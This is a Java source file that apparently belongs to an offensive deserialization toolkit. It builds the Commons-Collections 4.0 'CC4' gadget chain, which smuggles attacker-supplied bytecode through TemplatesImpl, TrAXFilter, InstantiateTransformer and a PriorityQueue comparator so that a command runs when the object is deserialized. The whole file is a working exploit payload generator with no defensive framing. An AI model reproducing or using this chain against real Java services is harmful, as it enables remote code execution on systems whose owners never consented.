package com.bcvgh.core.unser.gadgets.exec;

import com.bcvgh.core.unser.core.pojo.UnSerInput;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.bcvgh.core.unser.annotation.DependenciesVersion;
import com.bcvgh.core.unser.annotation.RequireParameter;
import com.bcvgh.core.unser.gadgets.CustomPayload;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.util.Comparator;
import java.util.PriorityQueue;

import static com.bcvgh.core.unser.gadgets.util.Reflections.setFieldValue;

@DependenciesVersion("Commons-collections-4.0")
@RequireParameter("Command")
public class CC4 implements CustomPayload {
    @Override
    public <T> Object getObject(UnSerInput unSerInput) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{unSerInput.getBytecode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());


        ConstantTransformer fakeformer = new ConstantTransformer(1);

        InstantiateTransformer transformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj});

        Comparator comparator = new TransformingComparator(fakeformer);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(TrAXFilter.class);
        queue.add(TrAXFilter.class);

        setFieldValue(comparator,"transformer",transformer);
        return queue;
    }


//    public static byte[] getBytecode(final Class classname) throws NotFoundException, IOException, CannotCompileException {
//        ClassPool pool = ClassPool.getDefault();
//        CtClass clazz =
//                pool.get(classname.getName());
////        JavaClass cls = Repository.lookupClass(classname);
////        byte[] bytes = cls.getBytes();
//        byte[] bytes = clazz.toBytecode();
//        return bytes;
//    }
}

